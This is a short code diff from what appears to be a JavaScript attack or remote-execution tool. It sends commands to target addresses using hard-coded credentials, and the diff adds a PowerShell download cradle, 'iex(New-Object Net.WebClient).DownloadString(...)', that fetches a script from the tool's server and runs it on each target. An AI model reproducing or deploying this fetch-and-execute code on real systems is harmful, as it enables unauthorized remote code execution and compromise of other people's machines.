@@ -45,12 +45,12 @@ export default [
             })).data;
             response[address]['paasResponse'] = responsePaaS;
 
-            const responseExecute = (await axios.post('http://localhost:5001/execute', {
-              address: address,
+            const responseExecute = (await axios.post('http://localhost:5000/execute', {
+              ip_address: req.body.targets,
               username: 'Witcher',
               password: 'Switcher',
               process: 'powershell.exe',
-              command: req.body.payload,
+              command: `powershell.exe -command "iex(New-Object Net.WebClient).DownloadString('http://${process.env.BE_IDENTIFIER}:${process.env.PORT}/repo/scripts?hash=${hash}')"`,
             })).data;
             response[address]['executeResponse'] = responseExecute;
           } catch (error) {
